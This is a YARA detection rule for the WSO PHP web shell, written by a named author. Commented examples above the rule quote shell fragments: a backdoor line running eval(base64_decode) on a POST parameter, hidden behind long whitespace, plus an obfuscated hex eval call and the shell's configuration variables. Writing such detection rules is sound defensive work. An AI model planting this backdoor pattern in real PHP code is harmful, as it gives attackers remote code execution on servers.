/*
$auth_pass = "63a9f0ea7bb98050796b649e85481845";
$color = "#df5";
$default_action = 'FilesMan';
*/

// Example one:
/*
<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nd7c9ee']));?><?php
$auth_pass = "63a9f0ea7bb98050796b649e85481845";
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
...
preg_replace(...
...
\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28...
*/

// Example two:
/*
<?php
$auth_pass = "";
$color = "#df5";
$default_action = base64_decode('RmlsZXNNYW4=');
*/

rule wso_php_shell: phpshell
{
    meta:
        description = "default wso shell"
        author = "delyee"
        reference = "https://github.com/delyee/yara_rules"
        date = "29.09.2019"
        sha256sum = "b2ffeeeb46add3430bdb3f3a301126b35a4e5563011c3b3dcefd3923d1427037"
    strings:
        $ = "$auth_pass"
        $ = "$default_action"
        $ = "$default_charset"
        $ = "$color"
        $ = "$default_use_ajax"
        $ = "WSO_VERSION"
        $ = "function wsoLogin() {"
        $ = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))"
        $ = "error_reporting"
        //$s7 = ""
    condition:
        4 of them
}
